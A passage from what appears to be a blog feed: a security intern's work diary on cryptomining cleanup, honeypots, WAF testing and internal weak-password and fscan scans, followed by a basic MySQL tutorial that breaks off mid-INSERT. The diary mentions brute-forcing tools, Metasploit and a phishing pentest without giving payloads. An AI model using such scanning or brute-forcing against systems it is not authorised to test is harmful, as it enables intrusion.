<p>进行了长亭waf压测，awk真好用，学了iptables（没太懂）</p>
<p>进入正常实习生活，之前被挖矿的几天是真的累。</p>
<h3 id="03日"><a href="#03日" class="headerlink" title="03日"></a>03日</h3><p>请了半天假开了组会。</p>
<p>写了个python脚本查中毒机器，并进行处理。看华为云、天眼发现报警，攻击者为外网IP忽略，为内网Ip找人查毒。</p>
<h3 id="06日"><a href="#06日" class="headerlink" title="06日"></a>06日</h3><p><del>发工资了，干劲又多了好多</del></p>
<p>看华为云、奇安信天眼日常看有问题没有，python脚本查毒，三四个有毒。</p>
<p>然后这边甲方安全不只搞安全，还接云端办公充实工作量，调研了（打语音电话）重点部门访谈使用体验和建议。</p>
<p>甲方安全还是爽。</p>
<h3 id="07日"><a href="#07日" class="headerlink" title="07日"></a>07日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，一个有毒。</p>
<p>然后和导师对了下公司弱口令排除的事情，明天在跟另外一个导师对就可以了。</p>
<p>下午几乎刷了一下午的lc sql，还挺爽。现在能够乱杀之前字节实习面试的sql题了（确信（bushi））</p>
<h3 id="08日"><a href="#08日" class="headerlink" title="08日"></a>08日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。和导师设置了云端办公问卷。</p>
<p>摸鱼刷了会sql，争取这个月把sql五页题水完。（现在已经进入光明正大摸鱼阶段了）</p>
<p>跟长亭沟通了之前的WAF测试计划，也对nginx这些负载均衡有了解，以及负载间https、http这些变化了些数。<a href="https://blog.csdn.net/wufangliang/article/details/103331357">https 下 多级nginx 反向代理设置_x-forwarded-proto $scheme-CSDN博客</a></p>
<h3 id="09日"><a href="#09日" class="headerlink" title="09日"></a>09日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。华为云发现一个内网爆破，应该是有毒的。以及弱口令找到了个1的密码整治了。发问卷发了50份。</p>
<p>下午办公助手和waf搭建沟通，第二天测试安waf前后差别。然后还是摸鱼刷会sql题。</p>
<h3 id="10号"><a href="#10号" class="headerlink" title="10号"></a>10号</h3><p>请了半天假，日常活。</p>
<h3 id="13、14、15、16、17日"><a href="#13、14、15、16、17日" class="headerlink" title="13、14、15、16、17日"></a>13、14、15、16、17日</h3><p>日常活。</p>
<h3 id="20日"><a href="#20日" class="headerlink" title="20日"></a>20日</h3><p>发现挖矿，top没找到很高的CPU，以为top被劫持了，使用busybox查看还是没有。</p>
<p>直接netstat -antp 找外网连接，发现一个奇怪的发现是病毒。systemctl status pid,看对应信息，然后exe交到微步，看看威胁情报。</p>
<p>后面复盘为什么top不高，发现可能是因为之前封了矿池的dns，病毒下载不到对应东西，所以没有挖矿起来。</p>
<h3 id="21日"><a href="#21日" class="headerlink" title="21日"></a>21日</h3><p>搭建了蜜罐HFISH，感觉还挺好用。</p>
<p>又被挖矿勒，现在会溯源了，知道怎样排查从哪来了，现在是挖矿排查糕手。其它就是些日常活。</p>
<h3 id="22、23日"><a href="#22、23日" class="headerlink" title="22、23日"></a>22、23日</h3><p>测试蜜罐跟微步情报和飞书结合，感觉挺好用。</p>
<p>有机器中毒了，上去找了半天有没找到毒，希望之后能够得出结论。</p>
<h3 id="24日-1"><a href="#24日-1" class="headerlink" title="24日"></a>24日</h3><p>安了msf，熟练了msf使用遇事不决就</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info d</span><br></pre></td></tr></table></figure>

<p>fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/nanhe7/p/15966742.htm</span><br></pre></td></tr></table></figure>

<h3 id="27日、28日"><a href="#27日、28日" class="headerlink" title="27日、28日"></a>27日、28日</h3><p>干杂活刷leetcode摸鱼的一天</p>
<h3 id="29日、30日"><a href="#29日、30日" class="headerlink" title="29日、30日"></a>29日、30日</h3><p>干杂活、绿盟扫，看漏洞。和知道创宇的讨论渗透测试服务。</p>
<h2 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h2><h3 id="01日-1"><a href="#01日-1" class="headerlink" title="01日"></a>01日</h3><p>请了半天假，还是日常活。之后好像有两家公司（360、知道创宇）要来攻防演练，希望能够有意思qaq</p>
<p><del>360提了两种放置：众测、人力天，现在才知道众测算是被白嫖了。。。</del></p>
<h3 id="04日"><a href="#04日" class="headerlink" title="04日"></a>04日</h3><p>fscan扫了下云端办公网段，发现不少弱口令，还有hadoop未授权访问。也扫了华为云、阿里云，然后就是些日常活</p>
<h3 id="05日"><a href="#05日" class="headerlink" title="05日"></a>05日</h3><p>日常活，摸鱼，搭waf，看雷池api，超级弱口令扫弱密码<a href="https://zhuanlan.zhihu.com/p/543309378">【附下载】爆破神器之超级弱口令检查工具使用 - 知乎 (zhihu.com)</a>，明天批量改密码</p>
<h3 id="06日-1"><a href="#06日-1" class="headerlink" title="06日"></a>06日</h3><p>发工资了，上w爽死了</p>
<p>日常活加写批量修改密码脚本。然后搭建yadcc环境，争取把源码看懂，和项目结构及对应配置看懂。</p>
<h3 id="07、08"><a href="#07、08" class="headerlink" title="07、08"></a>07、08</h3><p>yadcc</p>
<h3 id="11-15日"><a href="#11-15日" class="headerlink" title="11-15日"></a>11-15日</h3><p>日常活。学了下go。了解了分布式编译跑起来了yadcc、icecc。看了yadcc部分源码。<del>开始肝mit 854分布式lab</del></p>
<h3 id="18日"><a href="#18日" class="headerlink" title="18日"></a>18日</h3><p>发现挖矿机器，直接秒了（hadoop未授权访问，没啥好说的）</p>
<p>burp-autodecoder 还挺好用，能够爆破进行签名校验的网页。zoomeye试了下公司账号发现不如fofa一根，资产巨少</p>
<p>摸鱼（</p>
<h3 id="19、20日"><a href="#19、20日" class="headerlink" title="19、20日"></a>19、20日</h3><p>写蜜罐文档，已经开始在每个b端搭建蜜罐了</p>
<h3 id="21日-1"><a href="#21日-1" class="headerlink" title="21日"></a>21日</h3><p>处理前天蜜罐发现的中毒机器，找了半天，nmmd在docker里面，真逆天</p>
<p>ps -ef 半天没啥有效信息，后面换成了 ps -elf</p>
<h3 id="25日、26日"><a href="#25日、26日" class="headerlink" title="25日、26日"></a>25日、26日</h3><p>摸鱼加杂活。绩效又a，我爱momenta</p>
<h3 id="27日-1"><a href="#27日-1" class="headerlink" title="27日"></a>27日</h3><p>有台机器挖矿还是命令执行的，以为弱口令进来的爆了半天。结果是开了vscode server，whoami直接是root，服了</p>
<h3 id="28日"><a href="#28日" class="headerlink" title="28日"></a>28日</h3><p>处理hdmap的出网域名，发现三个未授权访问。被批评工具一知半解，fscan、绿盟之前都不是全端口扫描</p>
<h3 id="29日"><a href="#29日" class="headerlink" title="29日"></a>29日</h3><p>日常活。要放假了大家都比较兴奋哈哈哈</p>
<h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><h3 id="02日-1"><a href="#02日-1" class="headerlink" title="02日"></a>02日</h3><p>日常活</p>
<h3 id="03日-1"><a href="#03日-1" class="headerlink" title="03日"></a>03日</h3><p>呜呜呜，导师劝我好好研究研究代码，了解漏洞原理，还说有问题问她，太好了吧。</p>
<p>360渗透测试还是牛逼，直接钓鱼钓到了两个hr，直接cs上线了</p>
<h3 id="04日-1"><a href="#04日-1" class="headerlink" title="04日"></a>04日</h3><p>摸鱼复现大头ctf加日常活</p>
<h3 id="05日-1"><a href="#05日-1" class="headerlink" title="05日"></a>05日</h3><p>蜜罐终于要在每个B段搭好了，找人真麻烦。</p>
<p>感觉自己ctf水平跟之前比有质的提高，果然自己学学spring、go什么的还挺有用。</p>
<p>java 那些链感觉也有数了，能从更高的视角来看了。</p>
<p><a href="https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/">https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/</a></p>
<p><a href="https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/">https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<h3 id="08-20日"><a href="#08-20日" class="headerlink" title="08-20日"></a>08-20日</h3><p>开始写自动化代码了，WAF批量搭建、批量探活。</p>
<p>参与soc平台：flask+celery+sqlalchemy+ redis</p>
<p>代码水平极具增强但也很累。。。</p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql_basic</title>
    <url>/2023/03/03/mysql-basic/</url>
    <content><![CDATA[<h1 id="mysql概述"><a href="#mysql概述" class="headerlink" title="mysql概述"></a>mysql概述</h1><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><table>
<thead>
<tr>
<th>名称</th>
<th>全称</th>
<th>简称</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>存储数据的仓库，数据是有组织的进行存储</td>
<td>DataBase（DB）</td>
</tr>
<tr>
<td>数据库管理系统</td>
<td>操纵和管理数据库的大型软件</td>
<td>DataBase Management System (DBMS)</td>
</tr>
<tr>
<td>SQL</td>
<td>操作关系型数据库的语言，定义了一套操作关系型数据库统一标准</td>
<td>Structured Query Language (SQL)</td>
</tr>
</tbody></table>
<span id="more"></span>

<h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>MySQL官方提供了两种不同的版本：</p>
<p> 社区版本（MySQL Community Server） 免费， MySQL不提供任何技术支持 </p>
<p>商业版本（MySQL Enterprise Edition） 收费，可以使用30天，官方提供技术支持</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>略</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h3><p>cmd输入services.msc</p>
<p>找到</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303094200943.png" alt="image-20230303094200943"></p>
<p>控制登录与启动</p>
<p>或者命令行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net start mysql80</span><br><span class="line">net stop mysql80</span><br></pre></td></tr></table></figure>

<h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p> 方式一：使用MySQL提供的客户端命令行工具</p>
<p>方式二：使用系统自带的命令行工具执行指令（需要配置系统变量）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql [-h 127.0.0.1] [-P 3306] -u root -p</span><br><span class="line">参数：</span><br><span class="line">-h : MySQL服务所在的主机IP</span><br><span class="line">-P : MySQL服务端口号， 默认3306</span><br><span class="line">-u : MySQL数据库用户名</span><br><span class="line">-p ： MySQL数据库用户名对应的密码</span><br></pre></td></tr></table></figure>

<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><h4 id="关系型数据库（RDBMS）"><a href="#关系型数据库（RDBMS）" class="headerlink" title="关系型数据库（RDBMS）"></a>关系型数据库（RDBMS）</h4><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库。 而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095014254.png" alt="image-20230303095014254"></p>
<p>特点： A. 使用表存储数据，格式统一，便于维护。 B. 使用SQL语言操作，标准统一，使用方便。</p>
<h4 id="数据模型-1"><a href="#数据模型-1" class="headerlink" title="数据模型"></a>数据模型</h4><p>MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图下：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095111026.png" alt="image-20230303095111026" style="zoom:50%;" />

<p>我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。</p>
<p> 可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。</p>
<p> 一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包 含多行记录。</p>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h2><p>1). SQL语句可以单行或多行书写，以分号结尾。</p>
<p> 2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>
<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>
<p>4). 注释： 单行注释：– 注释内容 或 # 注释内容 多行注释：&#x2F;*注释内容 *&#x2F;</p>
<h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><table>
<thead>
<tr>
<th align="center">分 类</th>
<th align="center">全称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DDL</td>
<td align="center">Data Definition Language</td>
<td align="center">数据定义语言，用来定义数据库对象(数据库，表， 字段)</td>
</tr>
<tr>
<td align="center">DML</td>
<td align="center">Data Manipulation Language</td>
<td align="center">数据操作语言，用来对数据库表中的数据进行增删改</td>
</tr>
<tr>
<td align="center">DQL</td>
<td align="center">Data Query Language</td>
<td align="center">数据查询语言，用来查询数据库中表的记录</td>
</tr>
<tr>
<td align="center">DCL</td>
<td align="center">Data Control Language</td>
<td align="center">数据控制语言，用来创建数据库用户、控制数据库的 访问权限</td>
</tr>
</tbody></table>
<h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>1). 查询所有数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases ;</span><br></pre></td></tr></table></figure>

<p>2). 查询当前数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database() ;</span><br></pre></td></tr></table></figure>

<p>3). 创建数据库 create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序 规则 ] ;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序</span><br><span class="line">规则 ] ;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A:创建一个itcast数据库, 使用数据库默认的字符集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itcast;</span><br><span class="line">create database if not extists itcast;</span><br></pre></td></tr></table></figure>

<p>B:创建一个itheima数据库，并且指定字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itheima default charset utf8mb4;</span><br><span class="line">-- create database itheima default charset utf8;一般不建议使用utf-8</span><br></pre></td></tr></table></figure>

<p>4). 删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database [ if exists ] 数据库名 ;</span><br></pre></td></tr></table></figure>

<p>5). 切换数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名 ;</span><br><span class="line"># 可以使用select database();看自己当前使用的哪个数据库</span><br></pre></td></tr></table></figure>

<h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="查询创建"><a href="#查询创建" class="headerlink" title="查询创建"></a>查询创建</h4><p>1). 查询当前数据库所有表 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables; </span><br></pre></td></tr></table></figure>

<p>2). 查看指定表结构 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名 ;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102245084.png" alt="image-20230303102245084"></p>
<p>通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信 息。</p>
<p> 3). 查询指定表的建表语句 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名 ;</span><br></pre></td></tr></table></figure>

<p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p>
<p>4). 创建表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE 表名(</span><br><span class="line">字段1 字段1类型 [ COMMENT 字段1注释 ],</span><br><span class="line">字段2 字段2类型 [COMMENT 字段2注释 ],</span><br><span class="line">字段3 字段3类型 [COMMENT 字段3注释 ],</span><br><span class="line">......</span><br><span class="line">字段n 字段n类型 [COMMENT 字段n注释 ]</span><br><span class="line">) [ COMMENT 表注释 ] ;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table tb_user(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">name varchar(50) comment &#x27;姓名&#x27;,</span><br><span class="line">age int comment &#x27;年龄&#x27;,</span><br><span class="line">gender varchar(1) comment &#x27;性别&#x27;</span><br><span class="line">) comment &#x27;用户表&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102945089.png" alt="image-20230303102945089"></p>
<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>参考菜鸟教程</p>
<p><a href="https://www.runoob.com/mysql/mysql-data-types.html">MySQL 数据类型 | 菜鸟教程 (runoob.com)</a></p>
<p>1). 数值类型</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大</span><br><span class="line">age tinyint unsigned</span><br><span class="line">2). 分数 -- 总分100分, 最多出现一位小数</span><br><span class="line">score double(4,1)</span><br></pre></td></tr></table></figure>

<p>2). 字符串类型</p>
<p>vchar性能比char要低一些</p>
<p>用户名：vchar</p>
<p>性别：char</p>
<p>3). 日期时间类型</p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>设计一张员工信息表，要求如下：</p>
<ol>
<li>编号（纯数字） </li>
<li>员工工号 (字符串类型，长度不超过10位) </li>
<li>员工姓名（字符串类型，长度不超过10位） </li>
<li>性别（男&#x2F;女，存储一个汉字） </li>
<li>年龄（正常人年龄，不可能存储负数） </li>
<li>身份证号（二代身份证号均为18位，身份证中有X这样的字符） 入职时间（取值年月日即可）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table emp(</span><br><span class="line">    id int comment &quot;编号&quot;,</span><br><span class="line">    workno varchar(10) comment &quot;员工工号&quot;,</span><br><span class="line">    name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">	gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">	age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">	idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">	entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">) comment &quot;员工表&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>1). 添加字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: </p>
<p>为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp ADD nickname varchar(20) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>2). 修改数据类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure>

<p>3). 修改字段名和字段类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的nickname字段修改为username，类型为varchar(30)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>4). 删除字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的字段username删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp DROP username;</span><br></pre></td></tr></table></figure>

<p>5). 修改表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p> 将emp表的表名修改为 employee</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp RENAME TO employee;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>1). 删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE [ IF EXISTS ] 表名;</span><br><span class="line">DROP TABLE IF EXISTS tb_user;</span><br></pre></td></tr></table></figure>

<p>2). 删除指定表, 并重新创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE 表名;-- 在删除表的时候，表中的全部数据也都会被删除。</span><br></pre></td></tr></table></figure>

<h2 id="图形化界面工具"><a href="#图形化界面工具" class="headerlink" title="图形化界面工具"></a>图形化界面工具</h2><p>主流工具：sqlyog、Navicate、DataGrip</p>
<p>这次使用DataGrip</p>
<p>还挺好用，不会的sql可以在这里面看对于语句。</p>
<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="添加数据（INSERT）"><a href="#添加数据（INSERT）" class="headerlink" title="添加数据（INSERT）"></a>添加数据（INSERT）</h3><p>1). 给指定字段添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</span><br><span class="line">insert into employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class="line">values(1,&#x27;1&#x27;,&#x27;Itcast&#x27;,&#x27;男&#x27;,10,&#x27;123456789012345678&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class="line"></span><br><span class="line">insert into employee values(3,&#x27;3&#x27;,&#x27;韦一笑&#x27;,&#x27;男&#x27;,38,&#x27;123456789012345670&#x27;,&#x27;2005-01-</span><br><span class="line">01&#x27;),(4,&#x27;4&#x27;,&#x27;赵敏&#x27;,&#x27;女&#x27;,18,&#x27;123456789012345670&#x27;,&#x27;2005-01-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="修改数据（UPDATE）"><a href="#修改数据（UPDATE）" class="headerlink" title="修改数据（UPDATE）"></a>修改数据（UPDATE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ;</span><br><span class="line">update employee set name = &#x27;itheima&#x27; where id = 1;</span><br><span class="line">update employee set name = &#x27;小昭&#x27; , gender = &#x27;女&#x27; where id = 1;</span><br><span class="line">update employee set entrydate = &#x27;2008-01-01&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="删除数据（DELETE）"><a href="#删除数据（DELETE）" class="headerlink" title="删除数据（DELETE）"></a>删除数据（DELETE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM 表名 [ WHERE 条件 ] ;</span><br><span class="line">delete from employee where gender = &#x27;女&#x27;;</span><br><span class="line">delete from employee;</span><br></pre></td></tr></table></figure>

<h2 id="DOL"><a href="#DOL" class="headerlink" title="DOL"></a>DOL</h2><p>DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</p>
<p>数据准备:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table if exists employee;</span><br><span class="line">create table emp(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">workno varchar(10) comment &#x27;工号&#x27;,</span><br><span class="line">name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">workaddress varchar(50) comment &#x27;工作地址&#x27;,</span><br><span class="line">entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">)comment &#x27;员工表&#x27;;</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (1, &#x27;00001&#x27;, &#x27;柳岩666&#x27;, &#x27;女&#x27;, 20, &#x27;123456789012345678&#x27;, &#x27;北京&#x27;, &#x27;2000-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (2, &#x27;00002&#x27;, &#x27;张无忌&#x27;, &#x27;男&#x27;, 18, &#x27;123456789012345670&#x27;, &#x27;北京&#x27;, &#x27;2005-09-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (3, &#x27;00003&#x27;, &#x27;韦一笑&#x27;, &#x27;男&#x27;, 38, &#x27;123456789712345670&#x27;, &#x27;上海&#x27;, &#x27;2005-08-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (4, &#x27;00004&#x27;, &#x27;赵敏&#x27;, &#x27;女&#x27;, 18, &#x27;123456757123845670&#x27;, &#x27;北京&#x27;, &#x27;2009-12-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (5, &#x27;00005&#x27;, &#x27;小昭&#x27;, &#x27;女&#x27;, 16, &#x27;123456769012345678&#x27;, &#x27;上海&#x27;, &#x27;2007-07-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (6, &#x27;00006&#x27;, &#x27;杨逍&#x27;, &#x27;男&#x27;, 28, &#x27;12345678931234567X&#x27;, &#x27;北京&#x27;, &#x27;2006-01-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (7, &#x27;00007&#x27;, &#x27;范瑶&#x27;, &#x27;男&#x27;, 40, &#x27;123456789212345670&#x27;, &#x27;北京&#x27;, &#x27;2005-05-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (8, &#x27;00008&#x27;, &#x27;黛绮丝&#x27;, &#x27;女&#x27;, 38, &#x27;123456157123645670&#x27;, &#x27;天津&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (9, &#x27;00009&#x27;, &#x27;范凉凉&#x27;, &#x27;女&#x27;, 45, &#x27;123156789012345678&#x27;, &#x27;北京&#x27;, &#x27;2010-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (10, &#x27;00010&#x27;, &#x27;陈友谅&#x27;, &#x27;男&#x27;, 53, &#x27;123456789012345670&#x27;, &#x27;上海&#x27;, &#x27;2011-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (11, &#x27;00011&#x27;, &#x27;张士诚&#x27;, &#x27;男&#x27;, 55, &#x27;123567897123465670&#x27;, &#x27;江苏&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (12, &#x27;00012&#x27;, &#x27;常遇春&#x27;, &#x27;男&#x27;, 32, &#x27;123446757152345670&#x27;, &#x27;北京&#x27;, &#x27;2004-02-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (13, &#x27;00013&#x27;, &#x27;张三丰&#x27;, &#x27;男&#x27;, 88, &#x27;123656789012345678&#x27;, &#x27;江苏&#x27;, &#x27;2020-11-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES 